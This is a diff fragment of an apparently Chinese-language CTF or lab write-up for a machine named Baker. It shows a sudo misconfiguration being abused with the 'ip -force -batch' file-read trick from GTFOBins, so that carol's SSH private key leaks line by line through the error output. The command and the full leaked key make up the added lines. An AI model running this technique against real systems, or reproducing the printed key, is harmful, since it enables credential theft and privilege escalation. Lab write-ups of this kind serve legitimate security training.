@@ -493,5 +493,81 @@ User apache may run the following commands on Baker:
 能以`carol`用户权限执行ip，这有啥用呀。
 找到CTFOBins里面有ip命令的文件读取，我们试一下读ssh密钥。
 ```bash
-
+/var/www/localhost/htdocs/pages $ sudo -u carol ip -force -batch /home/carol/.ssh/id_rsa 2>&1
+Object "-----BEGIN" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:1
+Object "b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:2
+Object "NhAAAAAwEAAQAAAYEAzunA/rVWGzVXL9ybOK2AkZ4Ql2qgj+uCgzloUHIbYU8kL2ls0uqS" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:3
+Object "BDhYc/j1A9Xs39Z6TrgpYpHWY6yFkwj7p+BH/tW4E0vKRYFKsWg+HucfBg3sia5zjoan+D" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:4
+Object "zi8YtIcNHKGfNAMYvn17dhN7mOh31s5S1XmcEM4IKceGS/kthFtML3lcqDZdjK+uXDIi/3" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:5
+Object "fVkqyGKDyY7/Y/SRlhMfgYXrRyoBnyn5t/90Uo7I5gZeyD55gViDxzch/KTVkTwPlhL76S" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:6
+Object "HOhsM86RUSsUuvh9BjjIInr9VFG6VfUkz/hsDiN13hkX6Uta8USo90RiDkpJ1psZFXkzF8" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:7
+Object "ONgcZIk7tvCT9DYz0pikhmNgyxPQQuxoxPytYJ2XODttavlWlnhO6/XqILuq39PCROtlET" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:8
+Object "u6REVBoONS2fiRdFOr2IXnI4OGZKSriZO9JZ3uapYrxG3sIVRjjh72zmLmZZBAw/f/Xf2P" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:9
+Object "92DwNgu1WsHgkEgjgpd9SlKygwqlJjVl2ZPbHqE3AAAFiL7I+RG+yPkRAAAAB3NzaC1yc2" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:10
+Object "EAAAGBAM7pwP61Vhs1Vy/cmzitgJGeEJdqoI/rgoM5aFByG2FPJC9pbNLqkgQ4WHP49QPV" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:11
+Object "7N/Wek64KWKR1mOshZMI+6fgR/7VuBNLykWBSrFoPh7nHwYN7Imuc46Gp/g84vGLSHDRyh" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:12
+Object "nzQDGL59e3YTe5jod9bOUtV5nBDOCCnHhkv5LYRbTC95XKg2XYyvrlwyIv931ZKshig8mO" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:13
+Object "/2P0kZYTH4GF60cqAZ8p+bf/dFKOyOYGXsg+eYFYg8c3Ifyk1ZE8D5YS++khzobDPOkVEr" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:14
+Object "FLr4fQY4yCJ6/VRRulX1JM/4bA4jdd4ZF+lLWvFEqPdEYg5KSdabGRV5MxfDjYHGSJO7bw" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:15
+Object "k/Q2M9KYpIZjYMsT0ELsaMT8rWCdlzg7bWr5VpZ4Tuv16iC7qt/TwkTrZRE7ukRFQaDjUt" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:16
+Object "n4kXRTq9iF5yODhmSkq4mTvSWd7mqWK8Rt7CFUY44e9s5i5mWQQMP3/139j/dg8DYLtVrB" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:17
+Object "4JBII4KXfUpSsoMKpSY1ZdmT2x6hNwAAAAMBAAEAAAGAJuBJmDHHA2aywnXfHjePLAz4Th" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:18
+Object "LFJzVXOMOdA1xlI5PklxnmTfyvwaY6jFOu6XEUx/u60DaO5AvFrcWY9UbfTav4qvtJ0ipP" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:19
+Object "z15bA9kzrse7Dv6nvjiuUo2fWqdJ9ps2Wag5IkYPfh+syF2WoQs2qeNZhffOeT+J5Vb1Aj" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:20
+Object "PfwL3s3ukw7o51wLmKbbikwLQleoI55RuJamH5PzUQ85MVPNdGHQFZ+6c92aHgH7DfM0To" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:21
+Object "IxSF7NUOMWx88MShsd+IMas7QckLKZgJA/k5ZsrNQ6DDJWToAxUz+gkIIm3kdtubrthm1p" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:22
+Object "qqfTm6KZt80mSMF+v6XH8T/9VXGokSQ+mermQqdVjDPDy0McEvDlRxEyiYMmmOl7Z7evNx" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:23
+Object "hatLmkmQdzkWQWT79CMklDBYBoY3A7JSAHgKpz7pANsUYPCPrckowJrLkpn2iuoPa6Sm6g" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:24
+Object "xkj6LPxGiRB1Wb8+lSjtdLeWtdNGzN+Uitpuc9beHKjs2YvV2TcxPNmd4dr9TT3QdZAAAA" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:25
+Object "wQCHn+QqtwF6x5FLzfuoPzdeGXPJ0xUAUYJ6NAe1u8MVR9Qq63M8knsxRf9T6pDfvlLKy/" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:26
+Object "HE2AEaukoM6cgMABV7ZWTAJPCazoLukfLgk959hiQLNYtljpeB8+fuUtZoMWQZ+oGhqeEo" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:27
+Object "doINgvIRXqotHNAoaDgdqOPjXRu9WUczJvjJE6LSctcDwvf3VK2tmwZgM6u3hofKja4a7e" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:28
+Object "1HsRDqmefJ8SwcH82dnb7ohEe0gcEsu2d+gmjnuJeM2jxLmhoAAADBAOiKMN5ZNQt9nB3c" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:29
+Object "vLp/Io9201ize2VxQzyr1eVg13+l1LmLMAfEsNwH2zG8vaR1QPeFD5E1AtPNod4Yrm31JU" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:30
+Object "Ywou/SaXjeSgYnOrky92EUq3WIxA+2MzE0mgQbBpzdROOGuQ6Cm6IqGHc4Qvkjds04r0de" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:31
+Object "yh7a7glC875YFG0oj5jVVufnoLv2i/fjBlmE95HVBbUppYNfEvCu7kTItONG5c+FuJMyMq" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:32
+Object "EwuD8BpRFkZY3AnABXvMrdI7C+LUBQrwAAAMEA48mznyLZ0Fyz86mSeTuBuV2Mn4p+WDDc" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:33
+Object "uXAZiJKoJGBzEsXHa2dPOTCmBSxaDigJqb8VX7BYI2TqIF2DC3bwF7q3QwFY4K2m8oLBkd" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:34
+Object "zeK9Tc8UdBA4rBiwkaVer1JBY/OqQ9AVDDdUZFc+iUjqf+5pzZ+exrjmphUhg1ihqu6jBK" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:35
+Object "mIz5mpUFPp2zJBSGtidYKm29D95d0jiYjroffBRka8ofKChXNEYcCll8HsV7TQgmUlt/Kk" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:36
+Object "iH6wAeBvpBZgn5AAAAC2Nhcm9sQEJha2VyAQIDBAUGBw==" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:37
+Object "-----END" is unknown, try "ip help".
+Command failed /home/carol/.ssh/id_rsa:38
 ```
